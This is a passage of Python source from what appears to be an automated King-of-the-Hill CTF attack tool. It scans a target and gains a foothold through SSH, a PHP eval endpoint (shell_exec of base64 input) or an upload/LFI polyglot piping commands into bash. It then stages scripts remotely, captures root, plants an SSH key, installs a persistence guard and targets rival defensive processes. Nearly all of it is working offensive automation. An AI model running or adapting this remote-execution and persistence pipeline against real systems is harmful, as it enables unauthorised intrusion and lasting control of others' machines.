            "b64=$(printf '%s' \"$1\" | base64 -w0)\n"
            "exec curl -fsS --max-time 15 "
            "--data-urlencode \"code=echo shell_exec(base64_decode('$b64'));\" "
            f"{shlex.quote(str(foothold.get('url', '')))}\n"
        )
    elif kind == "upload_lfi":
        script = (
            "#!/bin/bash\n"
            "set -uo pipefail\n"
            "b64=$(printf '%s' \"$1\" | base64 -w0)\n"
            "exec curl -fsS --max-time 15 --get "
            f"--data-urlencode {shlex.quote('page=' + str(foothold.get('page', '')))} "
            "--data-urlencode \"c=echo $b64 | base64 -d | bash\" "
            f"{shlex.quote(str(foothold.get('base', '')) + '/')}\n"
        )
    else:
        return ""
    helper.write_text(script)
    helper.chmod(0o700)
    return f"bash {shlex.quote(str(helper))} {{CMD}}"


def conf_values(target: str, king: str, stage_dir: str, foothold: dict,
                key_path: Path | None, pub_path: Path | None,
                pub_text: str, open_ports, state: Path) -> dict:
    ports = ",".join(str(p) for p in (open_ports or AUTO_PORTS))
    return {
        "TARGET": target,
        "CHECKER_URL": f"http://{target}:9999/",
        "EXPECT_KING": king,
        "STAGE_DIR": stage_dir,
        "FOOTHOLD_CMD": _foothold_cmd(foothold, state),
        "FOOTHOLD_ADAPTER": "template",
        "SSH_USER": "root" if key_path else (foothold.get("user") or "root"),
        "SSH_PORT": str(foothold.get("port", 22)),
        "SSH_KEY": str(key_path) if key_path else "",
        "ROOT_CRON_TARGET": "",
        "ROOT_CRON_STUB": DEFAULT_GUARD_PATH,
        "GUARD_PATH": DEFAULT_GUARD_PATH,
        "KING_FILE": DEFAULT_KING_FILE,
        "KING_PATH": DEFAULT_KING_FILE,
        "AUTH_KEYS": DEFAULT_AUTH_KEYS,
        "STUB_OWNER": "root:root",
        "OUR_PUBKEY": str(pub_path) if pub_path else "",
        "OUR_IDENTITY": str(key_path) if key_path else "",
        "KEY_COMMENT": key_comment(pub_text),
        "PORTS": ports,
        "SENTRY_NAMES": list(DEFAULT_SENTRY_NAMES),
        "SENTRY_PATTERNS": ",".join(DEFAULT_SENTRY_NAMES),
        "WAIT_SECS": "90",
        "WORK_DIR": str(state),
        "ENEMY_PATTERNS": ["kothguard", "koth_detector"],
    }


def build_conf_text(values: dict) -> str:
    sentries = " ".join(str(x) for x in values.get("SENTRY_NAMES") or [])
    enemies = " ".join(str(x) for x in values.get("ENEMY_PATTERNS") or [])
    lines = [
        "# koth.conf — generated by `ctf.py koth auto`.",
        "# Sourced by the KOTH-OPS kit. Contains public material only.",
        "# Values are resolved by the CLI; environment overrides are not used.",
        "",
        f'TARGET="{_dq(values["TARGET"])}"',
        f'CHECKER_URL="{_dq(values["CHECKER_URL"])}"',
        f'EXPECT_KING="{_dq(values["EXPECT_KING"])}"',
        f'STAGE_DIR="{_dq(values["STAGE_DIR"])}"',
        "",
        f'FOOTHOLD_CMD="{_dq(values["FOOTHOLD_CMD"])}"',
        f'FOOTHOLD_ADAPTER="{_dq(values["FOOTHOLD_ADAPTER"])}"',
        f'SSH_USER="{_dq(values["SSH_USER"])}"',
        f'SSH_PORT="{_dq(values["SSH_PORT"])}"',
        f'SSH_KEY="{_dq(values["SSH_KEY"])}"',
        "",
        f'ROOT_CRON_TARGET="{_dq(values["ROOT_CRON_TARGET"])}"',
        f'ROOT_CRON_STUB="{_dq(values["ROOT_CRON_STUB"])}"',
        f'GUARD_PATH="{_dq(values["GUARD_PATH"])}"',
        "",
        f'KING_FILE="{_dq(values["KING_FILE"])}"',
        f'KING_PATH="{_dq(values.get("KING_PATH", values["KING_FILE"]))}"',
        f'AUTH_KEYS="{_dq(values["AUTH_KEYS"])}"',
        f'STUB_OWNER="{_dq(values.get("STUB_OWNER", "root:root"))}"',
        f'OUR_PUBKEY="{_dq(values["OUR_PUBKEY"])}"',
        f'OUR_IDENTITY="{_dq(values["OUR_IDENTITY"])}"',
        f'KEY_COMMENT="{_dq(values["KEY_COMMENT"])}"',
        "",
        f'PORTS="{_dq(values["PORTS"])}"',
        f"SENTRY_NAMES=({sentries})",
        f'SENTRY_PATTERNS="{_dq(values["SENTRY_PATTERNS"])}"',
        f"ENEMY_PATTERNS=({enemies})",
        f'WAIT_SECS="{_dq(values["WAIT_SECS"])}"',
        f'WORK_DIR="{_dq(values["WORK_DIR"])}"',
        "",
    ]
    return "\n".join(lines)


def write_conf(path: Path, values: dict) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(build_conf_text(values))
    try:
        path.chmod(0o600)
    except OSError:
        pass
    return path


# ---------------------------------------------------------------------------
# Logging / redaction
# ---------------------------------------------------------------------------
def redact_secrets(text: str) -> str:
    return _PRIVATE_KEY_RE.sub("[REDACTED PRIVATE KEY]", text or "")


def _log_step(log_dir: Path, name: str, result: dict) -> str:
    path = log_dir / f"{name}.log"
    header = [
        f"# step: {name}",
        f"# rc: {result.get('rc')}",
        f"# timeout: {result.get('timeout')}",
        f"# cmd: {result.get('cmd', '')}",
        "",
    ]
    body = redact_secrets(result.get("stdout") or "")
    stderr = redact_secrets(result.get("stderr") or "")
    if stderr:
        body += "\n--- stderr ---\n" + stderr
    try:
        path.write_text("\n".join(header) + body + "\n")
    except OSError:
        return ""
    return str(path)


def _step_record(name: str, result: dict, log_path: str = "",
                 skipped: bool = False) -> dict:
    stdout = result.get("stdout") or ""
    stderr = result.get("stderr") or ""
    return {
        "name": name,
        "ok": result.get("rc") == 0 and not skipped,
        "rc": result.get("rc"),
        "timeout": result.get("timeout"),
        "skipped": skipped,
        "log": log_path,
        "stdout_tail": redact_secrets(stdout)[-1200:],
        "stderr_tail": redact_secrets(stderr)[-800:],
    }


# ---------------------------------------------------------------------------
# Verify parsing / report
# ---------------------------------------------------------------------------
def parse_verify(stdout: str) -> dict:
    checks = {}
    for line in (stdout or "").splitlines():
        match = _VERIFY_LINE_RE.match(line.strip())
        if match:
            checks[match.group(1).strip()] = {
                "result": match.group(2).lower(),
                "detail": match.group(3).strip(),
            }
    return checks


def _verify_checks(checks: dict, *prefixes: str) -> dict:
    return {key: value for key, value in checks.items()
            if any(key.lower().startswith(p.lower()) for p in prefixes)}


def _area_result(checks: dict, overall: str) -> str:
    if not checks:
        return overall
    return "pass" if all(item.get("result") == "pass"
                         for item in checks.values()) else "fail"


def build_auto_report(payload: dict) -> str:
    target = payload.get("target") or "(unknown)"
    lines = [
        f"# KotH auto report — {target}",
        "",
        f"- Generated: {time.strftime('%Y-%m-%dT%H:%M:%S%z')}",
        f"- State dir: `{payload.get('state_dir') or '(none)'}`",
        f"- Config: `{payload.get('config') or '(none)'}`",
        f"- Dry run: {payload.get('dry_run')}",
        f"- Exit code: {payload.get('exit_code')}",
        f"- Result: {'PASS' if payload.get('ok') else 'FAIL'}",
        "",
    ]

    recon = payload.get("recon") or {}
    ports = recon.get("ports") or {}
    open_ports = recon.get("open") or []
    lines += ["## Ports", ""]
    if ports:
        lines += ["| Port | State |", "|---|---|"]
        lines += [f"| {port} | {'open' if state else 'closed'} |"
                  for port, state in ports.items()]
    else:
        lines.append(f"Planned scan: {', '.join(str(p) for p in AUTO_PORTS)}")
    lines += ["", f"Open: {', '.join(str(p) for p in open_ports) or '(none)'}", ""]

    foothold = payload.get("foothold") or {}
    lines += ["## Foothold", ""]
    if foothold.get("ok"):
        lines += [
            f"- Kind: {foothold.get('kind')}",
            f"- User: {foothold.get('user')} (uid {foothold.get('uid')})",
            f"- Detail: {_md(str(foothold.get('detail', ''))[:500])}",
        ]
    else:
        lines.append("- None detected")
        for attempt in foothold.get("attempts") or []:
            lines.append(
                f"  - {attempt.get('kind')}: {_md(str(attempt.get('detail', ''))[:200])}")
    lines.append("")

    vectors = payload.get("vectors") or []
    lines += ["## Vectors", ""]
    if vectors:
        lines += ["| Rank | Vector | Path | Why | ETA |", "|---|---|---|---|---|"]
        for vector in vectors:
            lines.append(
                f"| {vector.get('rank', '')} | {_md(str(vector.get('vector', '')))} "
                f"| {_md(str(vector.get('path', '')))} "
                f"| {_md(str(vector.get('why', '')))} "
                f"| {vector.get('est_time_sec', '')} |")
    else:
        lines.append("(none)")
    lines.append("")

    lines += ["## Actions", "", "| Step | rc | Timeout | Log |", "|---|---|---|---|"]
    for step in payload.get("steps") or []:
        state = "skipped" if step.get("skipped") else step.get("rc")
        if step.get("skipped") and step.get("stdout_tail"):
            state = f"{state} ({_md(str(step['stdout_tail'])[:80])})"
        lines.append(
            f"| {_md(step.get('name', ''))} | {state} | {step.get('timeout', '')} "
            f"| {_md(step.get('log', ''))} |")
    lines.append("")

    status = payload.get("status") or {}
    lines += ["## Status", "", "| Area | Result | Detail |", "|---|---|---|"]
    for area in ("king", "checker", "key", "sentries"):
        entry = status.get(area) or {}
        lines.append(
            f"| {area} | {_md(str(entry.get('result', 'unknown')))} "
            f"| {_md(str(entry.get('detail', ''))[:400])} |")
    lines.append("")

    failures = payload.get("failures") or []
    lines += ["## Failures", ""]
    lines += [f"- {_md(str(item))}" for item in failures] if failures else ["(none)"]
    lines.append("")
    if payload.get("next_action"):
        lines += ["## Next action", "", str(payload["next_action"]), ""]
    return "\n".join(lines).rstrip() + "\n"


def write_auto_report(state: Path, payload: dict) -> Path:
    path = state / "report.md"
    path.write_text(build_auto_report(payload))
    return path


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------
def _step_timeout(args, name: str) -> int:
    explicit = getattr(args, "timeout", None)
    if explicit:
        return int(explicit)
    return AUTO_STEP_TIMEOUTS.get(name, 120)


def _finalize(state: Path | None, payload: dict, rc: int):
    payload["exit_code"] = rc
    payload["ok"] = rc == AUTO_EXIT_OK
    if state is not None:
        try:
            payload["report"] = str(write_auto_report(state, payload))
        except OSError as exc:
            payload.setdefault("failures", []).append(
                f"cannot write report: {exc}")
    return rc, payload


def _planned_conf(target: str, king: str, key_path: Path | None,
                  pub_path: Path | None) -> dict:
    return {
        "TARGET": target,
        "CHECKER_URL": f"http://{target}:9999/",
        "EXPECT_KING": king,
        "STAGE_DIR": "/home/<foothold-user>/backups/files (else /dev/shm/.koth-stage or /tmp)",
        "FOOTHOLD_CMD": "(built from the detected foothold)",
        "FOOTHOLD_ADAPTER": "template",
        "SSH_USER": "root",
        "SSH_PORT": "22",
        "SSH_KEY": str(key_path) if key_path else "",
        "ROOT_CRON_TARGET": "(filled from discover.sh output)",
        "ROOT_CRON_STUB": DEFAULT_GUARD_PATH,
        "GUARD_PATH": DEFAULT_GUARD_PATH,
        "KING_FILE": DEFAULT_KING_FILE,
        "KING_PATH": DEFAULT_KING_FILE,
        "AUTH_KEYS": DEFAULT_AUTH_KEYS,
        "STUB_OWNER": "root:root",
        "OUR_PUBKEY": str(pub_path) if pub_path else "",
        "OUR_IDENTITY": str(key_path) if key_path else "",
        "KEY_COMMENT": "(from the .pub file)",
        "PORTS": ",".join(str(p) for p in AUTO_PORTS),
        "SENTRY_NAMES": list(DEFAULT_SENTRY_NAMES),
        "SENTRY_PATTERNS": ",".join(DEFAULT_SENTRY_NAMES),
        "WAIT_SECS": "90",
        "WORK_DIR": "(state dir)",
        "ENEMY_PATTERNS": ["kothguard", "koth_detector"],
    }


def _dry_run_plan(target: str, king: str, key_path: Path | None,
                  pub_path: Path | None, scripts: dict) -> dict:
    return {
        "target": target,
        "ports": list(AUTO_PORTS),
        "footholds": [
            {"kind": "ssh", "detail": f"ssh -i KEY root@{target} id",
             "key": str(key_path) if key_path else "(no key)"},
            {"kind": "http_eval",
             "detail": f"POST code=... http://{target}:8002/trycode|/eval|/cmd"},
            {"kind": "upload_lfi",
             "detail": f"POST polyglot http://{target}:8001/support.php then "
                       f"GET /?page=uploads/<hash>.jpg&c=id"},
        ],
        "config": _planned_conf(target, king, key_path, pub_path),
        "steps": [
            {"name": "recon", "detail": "parallel TCP connect scan"},
            {"name": "foothold", "detail": "first success wins, 5s each"},
            {"name": "discover", "script": str(scripts.get("discover") or "")},
            {"name": "capture", "script": str(scripts.get("capture") or "")},
            {"name": "restore", "script": str(scripts.get("restore") or "")},
            {"name": "lock_vector", "script": str(scripts.get("lock_vector") or "")},
            {"name": "guard_install", "script": str(scripts.get("guard_install") or "")},
            {"name": "verify", "script": str(scripts.get("verify") or "")},
        ],
        "notes": [
            "--dry-run performs no network calls and runs no kit script",
            "state, logs and report stay under the per-target state dir",
        ],
    }


def _post_step(name: str, foothold: dict, stage_dir: str,
               local_script: Path | None, env: dict, argv: list[str],
               timeout: int) -> dict:
    if local_script is None:
        return {"rc": 0, "stdout": "", "stderr": "", "timeout": timeout,
                "skipped": True, "detail": f"{name}.sh not installed"}
    remote = f"{stage_dir}/{name}.sh"
    staged = ensure_remote_script(foothold, local_script, remote, timeout)
    if staged.get("rc") != 0:
        return staged
    env_prefix = " ".join(
        f"{key}={shlex.quote(str(value))}" for key, value in env.items()
        if value not in (None, ""))
    command = f"{env_prefix + ' ' if env_prefix else ''}bash {shlex.quote(remote)}"
    if argv:
        command += " " + " ".join(shlex.quote(str(arg)) for arg in argv)
    result = run_remote(foothold, command, timeout)
    result["cmd"] = command
    return result


def _find_auto_script(name: str, kit_dir: str | None) -> Path | None:
    """Find a kit script, falling back to the canonical KOTH-OPS tree."""
    found = find_script(SCRIPT_NAMES[name], kit_dir)
    if found is None:
        found = find_script(SCRIPT_NAMES[name], ops_dir())
    return found


def run_auto(args) -> tuple[int, dict]:
    """Run the full autonomous KotH pipeline. Returns (exit code, payload)."""
    dry_run = bool(getattr(args, "dry_run", False))
    payload = {
        "type": "koth_auto",
        "ok": False,
        "dry_run": dry_run,
        "target": None,
        "state_dir": None,
        "config": None,
        "report": None,
        "log_dir": None,
        "exit_code": AUTO_EXIT_CONFIG,
        "steps": [],
        "failures": [],
        "recon": {},
        "foothold": {},
        "vectors": [],
        "status": {},
        "next_action": "",
    }

    try:
        target = normalize_target(getattr(args, "target", ""))
    except ValueError as exc:
        payload["error"] = str(exc)
        payload["next_action"] = (
            "pass a bare host, e.g. `ctf.py koth auto 10.0.0.1`")
        return AUTO_EXIT_CONFIG, payload

    payload["target"] = target
    try:
        state = state_dir_for(target)
    except ValueError as exc:
        payload["error"] = str(exc)
        payload["next_action"] = "choose a state root outside /tmp"
        return AUTO_EXIT_CONFIG, payload
    state.mkdir(parents=True, exist_ok=True)
    log_dir = state / "logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    payload["state_dir"] = str(state)
    payload["log_dir"] = str(log_dir)

    kit_dir = getattr(args, "kit_dir", "") or None
    scripts = {name: _find_auto_script(name, kit_dir)
               for name in (*AUTO_CORE_SCRIPTS, *AUTO_POST_SCRIPTS)}
    missing = [name for name in AUTO_CORE_SCRIPTS if scripts.get(name) is None]
    if missing:
        payload["error"] = "kit not installed: missing " + ", ".join(
            SCRIPT_NAMES[name] for name in missing)
        payload["next_action"] = (
            "install KOTH-OPS or pass --kit-dir / set CTF_KOTH_KIT")
        return _finalize(state, payload, AUTO_EXIT_CONFIG)

    king = (getattr(args, "king", "") or os.environ.get("KOTH_KING")
            or DEFAULT_EXPECT_KING).strip() or DEFAULT_EXPECT_KING
    key_path = resolve_key_path(getattr(args, "key", "") or None)
    pub_path, pub_text = pubkey_for(key_path)
    payload["key"] = {
        "private": str(key_path) if key_path else None,
        "public": str(pub_path) if pub_path else None,
        "comment": key_comment(pub_text),
    }
    payload["expect_king"] = king

    if dry_run:
        payload["plan"] = _dry_run_plan(target, king, key_path, pub_path, scripts)
        payload["status"] = {
            "king": {"result": "planned", "detail": king},
            "checker": {"result": "planned",
                        "detail": f"http://{target}:9999/"},
            "key": {"result": "planned",
                    "detail": str(pub_path) if pub_path else "(no public key)"},
            "sentries": {"result": "planned",
                         "detail": ",".join(DEFAULT_SENTRY_NAMES)},
        }
        return _finalize(state, payload, AUTO_EXIT_OK)

    # --- recon -------------------------------------------------------------
    try:
        ports, open_ports = discover_open_ports(target)
    except Exception as exc:  # noqa: BLE001 - recon must fail cleanly
        payload["failures"].append(f"recon error: {exc}")
        payload["recon"] = {"ports": {}, "open": [], "error": str(exc)}
        payload["next_action"] = (
            "recon failed; check VPN/network reachability and retry")
        return _finalize(state, payload, AUTO_EXIT_RECON)

    payload["recon"] = {
        "ports": {str(port): bool(state_) for port, state_ in ports.items()},
        "open": open_ports,
    }
    recon_result = {
        "rc": 0 if open_ports else 1,
        "stdout": "\n".join(
            f"{port} {'open' if ports.get(port) else 'closed'}"
            for port in ports),
        "stderr": "",
        "timeout": 1,
    }
    recon_log = _log_step(log_dir, "recon", recon_result)
    payload["steps"].append({
        "name": "recon",
        "ok": bool(open_ports),
        "rc": recon_result["rc"],
        "timeout": 1,
        "skipped": False,
        "log": recon_log,
        "stdout_tail": ",".join(str(p) for p in open_ports),
        "stderr_tail": "",
    })
    if not open_ports:
        payload["failures"].append("no open ports among " +
                                   ",".join(str(p) for p in AUTO_PORTS))
        payload["next_action"] = (
            "recon failed; the target is down, filtered, or off-VPN")
        return _finalize(state, payload, AUTO_EXIT_RECON)

    # --- foothold ----------------------------------------------------------
    foothold = detect_foothold(target, key_path, open_ports, timeout=5.0)
    payload["foothold"] = foothold
    foothold_result = {
        "rc": 0 if foothold.get("ok") else 1,
        "stdout": json.dumps(
            {key: value for key, value in foothold.items()
             if key != "attempts"}, default=str),
        "stderr": "",
        "timeout": 5,
    }
    foothold_log = _log_step(log_dir, "foothold", foothold_result)
    payload["steps"].append({
        "name": "foothold",
        "ok": bool(foothold.get("ok")),
        "rc": foothold_result["rc"],
        "timeout": 5,
        "skipped": False,
        "log": foothold_log,
        "stdout_tail": str(foothold.get("detail", ""))[:400],
        "stderr_tail": "",
    })
    if not foothold.get("ok"):
        payload["failures"].append("no foothold (ssh/eval/upload all failed)")
        payload["next_action"] = (
            "no foothold; verify the key with --key, check :8002 /trycode "
            "and :8001 support.php, then retry")
        return _finalize(state, payload, AUTO_EXIT_FOOTHOLD)

    stage_dir = probe_stage_dir(foothold, foothold.get("user", ""), timeout=5.0)
    payload["stage_dir"] = stage_dir
    stage_result = {"rc": 0, "stdout": stage_dir, "stderr": "", "timeout": 5}
    stage_log = _log_step(log_dir, "stage_dir", stage_result)
    payload["steps"].append({
        "name": "stage_dir",
        "ok": True,
        "rc": 0,
        "timeout": 5,
        "skipped": False,
        "log": stage_log,
        "stdout_tail": stage_dir,
        "stderr_tail": "",
    })

    # --- config ------------------------------------------------------------
    values = conf_values(target, king, stage_dir, foothold, key_path, pub_path,
                         pub_text, open_ports, state)
    conf_path = write_conf(state / "koth.conf", values)
    payload["config"] = str(conf_path)

    # --- discover ----------------------------------------------------------
    discover_script = scripts["discover"]
    remote_discover = f"{stage_dir}/discover.sh"
    staged = upload_remote(
        foothold, discover_script.read_bytes(), remote_discover,
        timeout=_step_timeout(args, "discover"))
    if staged.get("rc") != 0:
        payload["failures"].append("cannot stage discover.sh on the target")
        payload["next_action"] = (
            "foothold cannot upload files; try SSH or the :8002 eval endpoint")
        return _finalize(state, payload, AUTO_EXIT_RECON)
    discover = run_remote(
        foothold, f"bash {shlex.quote(remote_discover)}",
        timeout=_step_timeout(args, "discover"))
    discover["vectors"] = parse_discover(discover.get("stdout") or "")
    discover_log = _log_step(log_dir, "discover", discover)
    payload["steps"].append(_step_record("discover", discover, discover_log))
    payload["vectors"] = discover["vectors"]
    if discover.get("rc") != 0:
        payload["failures"].append("discover.sh failed on the target")
        payload["next_action"] = (
            "discover failed; inspect logs/discover.log and retry")
        return _finalize(state, payload, AUTO_EXIT_RECON)
    if not payload["vectors"] and not getattr(args, "vector", ""):
        payload["failures"].append("discover.sh found no vectors")
        payload["next_action"] = (
            "no vectors found; capture cannot proceed, re-run discovery manually")
        return _finalize(state, payload, AUTO_EXIT_CAPTURE)

    # Fill ROOT_CRON_TARGET from discovery when the cron family is present.
    if not values.get("ROOT_CRON_TARGET"):
        for vector in payload["vectors"]:
            if (vector.get("vector") in ("cron", "systemd_timer")
                    and vector.get("path")):
                values["ROOT_CRON_TARGET"] = vector["path"]
                write_conf(conf_path, values)
                break

    # --- capture -----------------------------------------------------------
    capture_argv = ["--config", str(conf_path)]
    vector_override = getattr(args, "vector", "") or ""
    if vector_override:
        capture_argv += ["--vector", vector_override]
    capture = run_script(
        scripts["capture"], capture_argv, _step_timeout(args, "capture"),
        env_extra={"WORK_DIR": str(state)})
    capture_log = _log_step(log_dir, "capture", capture)
    payload["steps"].append(_step_record("capture", capture, capture_log))
    if capture.get("rc") != 0:
        payload["failures"].append(f"capture.sh rc={capture.get('rc')}")
        payload["next_action"] = (
            "capture failed; read logs/capture.log, then retry with "
            "`--vector NAME`")
        return _finalize(state, payload, AUTO_EXIT_CAPTURE)

    # --- post-capture: restore / lock / guard ------------------------------
    # capture.sh already runs these as root inside its staged payload. Re-run
    # them only when the foothold itself is root, which makes the steps
    # idempotent and observable without touching a non-root local account.
    root_foothold = foothold.get("kind") == "ssh" and foothold.get("uid") == 0
    post_specs = [
        ("restore", {
            "KING_FILE": DEFAULT_KING_FILE,
            "EXPECT_KING": king,
            "SSH_DIR": "/root/.ssh",
            "KEYFILE": f"{stage_dir}/id.pub",
        }, [f"{stage_dir}/id.pub"]),
        ("lock_vector", {"REMOVE_PATHS_STR": ""},
         [values.get("ROOT_CRON_TARGET", ""), values.get("ROOT_CRON_STUB", "")]),
        ("guard_install", {
            "GUARD_PATH": DEFAULT_GUARD_PATH,
            "KING_FILE": DEFAULT_KING_FILE,
            "EXPECT_KING": king,
        }, []),
    ]
    for name, env, argv in post_specs:
        if not root_foothold:
            payload["steps"].append({
                "name": name,
                "ok": True,
                "rc": 0,
                "timeout": _step_timeout(args, name),
                "skipped": True,
                "log": "",
                "stdout_tail": "executed by capture.sh root payload",
                "stderr_tail": "",
            })
            continue
        if name == "lock_vector" and not values.get("ROOT_CRON_TARGET"):
            payload["steps"].append({
                "name": name,
                "ok": True,
                "rc": 0,
                "timeout": _step_timeout(args, name),
                "skipped": True,
                "log": "",
                "stdout_tail": "no ROOT_CRON_TARGET",
                "stderr_tail": "",
            })
            continue
        result = _post_step(
            name, foothold, stage_dir, scripts.get(name), env, argv,
            _step_timeout(args, name))
        log_path = _log_step(log_dir, name, result)
        payload["steps"].append(_step_record(
            name, result, log_path, skipped=bool(result.get("skipped"))))
        if result.get("rc") != 0 and not result.get("skipped"):
            payload["failures"].append(
                f"{name}.sh rc={result.get('rc')} (capture payload may have "
                "already applied it)")

    # --- verify ------------------------------------------------------------
    verify = run_script(
        scripts["verify"], ["--config", str(conf_path)],
        _step_timeout(args, "verify"),
        env_extra={"KIT_STATE_DIR": str(state)})
    verify_log = _log_step(log_dir, "verify", verify)
    payload["steps"].append(_step_record("verify", verify, verify_log))

    checks = parse_verify(verify.get("stdout") or "")
    verify_pass = verify.get("rc") == 0
    overall = "pass" if verify_pass else "fail"
    king_checks = _verify_checks(checks, "king")
    checker_checks = _verify_checks(checks, "checker")
    key_checks = _verify_checks(checks, "authorized_keys", "key")
    sentry_checks = _verify_checks(checks, "sentry")
    payload["status"] = {
        "king": {
            "result": _area_result(king_checks, overall),
            "detail": king,
            "checks": king_checks,
        },
        "checker": {
            "result": _area_result(checker_checks, overall),
            "detail": f"http://{target}:9999/",
            "checks": checker_checks,
        },
        "key": {
            "result": _area_result(key_checks, overall),
            "detail": f"{pub_path or '(no public key)'} "
                      f"comment={key_comment(pub_text) or '(none)'}",
            "checks": key_checks,
        },
        "sentries": {
            "result": _area_result(sentry_checks, overall),
            "detail": ",".join(DEFAULT_SENTRY_NAMES),
            "checks": sentry_checks,
        },
    }
    if not verify_pass:
        payload["failures"].append(f"verify.sh rc={verify.get('rc')}")
        payload["next_action"] = (
            "verify failed; the hold is not stable — read logs/verify.log "
            "and re-run capture")
        return _finalize(state, payload, AUTO_EXIT_VERIFY)

    return _finalize(state, payload, AUTO_EXIT_OK)

